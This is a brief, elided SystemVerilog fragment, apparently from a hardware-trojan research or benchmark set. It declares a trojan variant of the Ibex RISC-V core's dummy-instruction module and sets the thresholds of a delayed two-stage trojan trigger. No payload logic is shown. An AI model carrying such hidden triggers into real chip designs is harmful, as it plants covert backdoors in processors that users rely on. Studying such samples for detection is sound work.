...
module ibex_dummy_instr_trojan_Covert import ibex_pkg::*; #(
  ...
  localparam int unsigned LFSR_OUT_W = $bits(lfsr_data_t);
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=3800, act=1900)
    // ============================================================
    localparam int ARM_THRESHOLD   = 3800;
    localparam int ACTIVATE_DELAY  = 1900;
